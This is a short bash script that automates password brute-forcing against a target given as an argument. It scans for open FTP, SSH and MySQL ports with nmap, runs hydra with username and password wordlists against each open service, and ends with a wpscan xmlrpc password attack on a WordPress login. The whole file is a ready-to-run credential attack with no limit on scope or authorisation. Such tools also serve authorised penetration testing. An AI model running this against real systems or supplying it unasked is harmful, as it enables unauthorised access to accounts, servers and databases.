#!/bin/bash
target="$1"

username_file=scripts/user.txt
wordlist_file=scripts/pass.txt

# Function to perform brute force on FTP service
brute_force_ftp() {
    echo "Starting FTP brute force..."
    hydra -L ${username_file} -P ${wordlist_file} ftp://${target}
}

# Function to perform brute force on SSH service
brute_force_ssh() {
    echo "Starting SSH brute force..."
    hydra -L ${username_file} -P ${wordlist_file} ssh://${target}
}

# Function to perform brute force on MySQL service
brute_force_mysql() {
    echo "Starting MySQL brute force..."
    hydra -L ${username_file} -P ${wordlist_file} mysql://${target}
}

# Scan for open ports using nmap
echo "Scanning for open ports on ${target}..."
nmap_output=$(nmap -p21,22,3306 ${target} | grep -E '^(21|22|3306)/tcp' | awk '{print $1}')

# Check if FTP port is open and perform brute force
if echo ${nmap_output} | grep -q '21/tcp'; then
    brute_force_ftp
fi

# Check if SSH port is open and perform brute force
if echo ${nmap_output} | grep -q '22/tcp'; then
    brute_force_ssh
fi

# Check if MySQL port is open and perform brute force
if echo ${nmap_output} | grep -q '3306/tcp'; then
    brute_force_mysql
fi

# check User/pass wp-admin page
wpscan --password-attack xmlrpc -t 20 -U ${username_file} -P ${wordlist_file}  --url http://"${target}"
